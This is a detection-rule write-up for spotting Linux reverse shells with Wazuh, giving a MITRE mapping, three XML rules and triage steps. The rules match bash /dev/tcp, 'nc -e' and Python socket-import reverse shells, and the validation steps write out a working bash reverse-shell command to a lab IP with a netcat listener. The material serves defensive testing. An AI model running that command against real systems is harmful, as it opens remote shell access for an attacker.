# Linux Reverse Shell Detection

## Threat Scenario
After exploiting a vulnerability on a Linux system, an attacker will typically establish a reverse shell to gain an interactive command-line interface. Reverse shells connect from the compromised internal machine outward to an attacker-controlled listening server, bypassing inbound firewall restrictions.

## MITRE ATT&CK Mapping
- **Tactic**: Execution (TA0002)
- **Technique**: Command and Scripting Interpreter (T1059)
- **Sub-technique**: Unix Shell (T1059.004)

## Telemetry Requirements
- Linux `auditd` logs (monitoring `execve` syscalls)
- Wazuh command monitoring (syscheck / ossec)

## Detection Logic
These rules look for common command-line signatures of reverse shells in process execution logs:
- **Rule 100190**: Detects the classic Bash reverse shell syntax utilizing `/dev/tcp/` sockets.
- **Rule 100191**: Detects Netcat (`nc`) executed with the `-e` flag, binding a shell to the network socket.
- **Rule 100192**: Detects common Python one-liner reverse shells importing `socket`, `subprocess`, and `os`.

## Wazuh Rule XML
```xml
<group name="linux, execution, reverse_shell,">
  <rule id="100190" level="12">
    <decoded_as>auditd</decoded_as>
    <match>bash -i</match>
    <match>/dev/tcp/</match>
    <description>Linux Reverse Shell: Bash /dev/tcp connection detected</description>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>

  <rule id="100191" level="12">
    <decoded_as>auditd</decoded_as>
    <match>nc -e /bin/sh</match>
    <match>nc -e /bin/bash</match>
    <description>Linux Reverse Shell: Netcat execution with shell detected</description>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>

  <rule id="100192" level="12">
    <decoded_as>auditd</decoded_as>
    <match type="pcre2">python.*import socket,subprocess,os</match>
    <description>Linux Reverse Shell: Python reverse shell detected</description>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>
</group>
```

## Validation Procedure
1. Set up a listener on Kali Linux: `nc -lvnp 4444`
2. Run the following from the Linux target:
```bash
bash -i >& /dev/tcp/192.168.56.50/4444 0>&1
```

## False Positive Considerations
Extremely low. Standard administrative tasks do not utilize reverse shells. Automated deployment scripts rarely use these patterns.

## Triage Steps
1. Identify the compromised machine.
2. Determine the external IP and port the reverse shell connected to.
3. Investigate the web server or application logs to find the initial exploit vector (e.g., File Upload, RCE vulnerability).
4. Isolate the machine to sever the attacker's connection.
